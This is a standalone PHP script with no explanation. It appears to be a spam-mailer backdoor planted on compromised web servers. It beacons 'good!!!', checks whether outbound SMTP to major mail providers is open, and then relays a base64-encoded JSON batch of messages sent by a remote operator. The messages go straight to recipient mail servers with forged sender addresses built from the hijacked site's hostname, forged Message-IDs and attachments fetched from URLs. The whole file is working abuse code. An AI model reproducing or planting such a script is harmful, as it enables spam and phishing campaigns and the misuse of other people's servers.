<?php
    error_reporting(0);

    if ($_POST['check'] == '1') {
	$mxs = array(
		    'gmail-smtp-in.l.google.com',
		    'mx.yandex.ru',
		    'mxs.mail.ru'
		);

	foreach($mxs as $mx) {
	    $smtp = fsockopen($mx, 25, $errno, $errstr, 1);
	    stream_set_timeout($smtp, 1);
	    fwrite($smtp, "HELO ".$mx."\r\n");
	    $read = fgets($smtp);

	    if (preg_match('/220/', $read)) {
		$out[] = 'OK';
	    } else {
		$out[] = 'NO';
	    }
	}

	if(in_array('OK', $out)) {
	    echo 'OK';
	} else {
	    echo 'NO';
	}
	die();
    }

    if (!$_POST['data']) {
	echo "good!!!";
	die();
    }

    $data = json_decode(base64_decode(str_replace(' ', '+', $_POST['data'])), true);
    foreach($data as $val) {
	if (!empty($val['to'])) {
	    $boundary = '--' . md5(uniqid(time()));
	    $val['from'] = str_replace('[HOST]', $_SERVER['SERVER_NAME'], $val['from']);

	    $sender = explode('@', $val['from']);
	    $domain = $sender[1];
	    $sender = $sender[0];

	    $recipient = explode('@', $val['to']);
	    $recipient = $recipient[0];

	    $val['header'] = 'From: =?utf-8?B?'. base64_encode($val['name']).'?= <'.$val['from'].'>';
	    $val['header'] .= PHP_EOL.'To: '.$val['to'];
	    $val['header'] .= PHP_EOL.'Subject: '.$val['subj'];
	    $val['header'] .= PHP_EOL.'Message-ID: '.md5($sender . $recipient).'@'.$domain;
	    $val['header'] .= PHP_EOL.'MIME-Version: 1.0';

	    if (!empty($data['attach'])) {
		$val['header'] .= PHP_EOL.'Content-Type: multipart/mixed; boundary="'.$boundary.'"';
	    } else {
		$val['header'] .= PHP_EOL.'Content-Type: '.$val['type'].'; charset=UTF-8;';
	    }

	    if (!empty($data['attach'])) {
		$text = $val['text'];
		$val['text'] = '--'.$boundary;
		$val['text'] .= PHP_EOL.'Content-Type: '.$val['type'].'; charset=UTF-8;';
		$val['text'] .= PHP_EOL.'Content-Transfer-Encoding: base64'.PHP_EOL;
		$val['text'] .= PHP_EOL.chunk_split(base64_encode($text));

		foreach($data['attach'] as $attach) {
		    $file = file_get_contents($attach['url']);
		    if (!empty($file)) {
			$val['text'] .= PHP_EOL.'--'.$boundary;
			$val['text'] .= PHP_EOL.'Content-Type: '.$attach['mime'].'; name = "'.$attach['name'].'"';
			$val['text'] .= PHP_EOL.'Content-Transfer-Encoding: base64'.PHP_EOL;
			$val['text'] .= PHP_EOL.chunk_split(base64_encode($file));
		    }
		}
	    }

	    $val['header'] = str_replace('[HOST]', $_SERVER['SERVER_NAME'], $val['header'])."\n";

	    $result = 'NO';

	    if ($result == 'NO') {
		$result = send_smtp($val['mx'], $val['from'], $val['to'], $val['subj'], $val['text'], $val['header']);
	    }

	    $arr[] =  array(
			'id'=>$val['id'],
			'from'=>$val['from'],
			'name'=>$val['name'],
			'to'=>$val['to'],
			'result'=>$result[0],
			'time'=>$result[1],
			'errors'=>$result[2]
			);
	}
    }

    echo base64_encode(json_encode($arr));

    function send_smtp($mx, $from, $to, $subj, $text, $header) {
	$start_time = mktime();

	$smtp = fsockopen($mx, 25, $errno, $errstr, 1);

	stream_set_timeout($smtp, 1);

	fwrite($smtp, 'HELO '.$mx."\r\n");
	$reply[] = 'HELO '.$mx."\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, 'MAIL FROM:<'.$from.'>'."\r\n");
	$reply[] = 'MAIL FROM:<'.$from.'>'."\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, 'RCPT TO:<'.$to.'>'."\r\n");
	$reply[] = 'RCPT TO:<'.$to.'>'."\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, 'DATA' . "\r\n");
	$reply[] = 'DATA' . "\r\n";
	$reply[] = fgets($smtp);

	foreach (explode("\n", $header) as $val) {
	    $headers .= $val."\r\n";
	}

	fwrite($smtp, $headers."\r\n");
	$reply[] = $headers."\r\n\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, $text."\r\n");
	$reply[] = $text."\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, "\r\n".'.'."\r\n");
	$reply[] = "\r\n".'.'."\r\n";
	$reply[] = $reply[] = fgets($smtp);

	fwrite($smtp, 'QUIT'."\r\n");
	$reply[] = 'QUIT'."\r\n";
	$reply[] = fgets($smtp);

	fclose($smtp);

//	var_dump($reply);

	$smtp_errors = "421,422,431,432,441,442,446,447,449,450,451,452,471,500,501,502,503,504,510,511,512,513,523,530,541,550,551,552,553,554";
	foreach(explode(',', $smtp_errors) as $err) {
	    if(preg_grep('/^'.$err.'/i', $reply)) {
		$errors[] = $err;
	    }
	}

	$time = (mktime()-$start_time);
	if($errno || $errors) {
	    return array('NO',$time,implode(",", $errors));
	} else {
	    return array('OK',$time,'');
	}
    }
?>
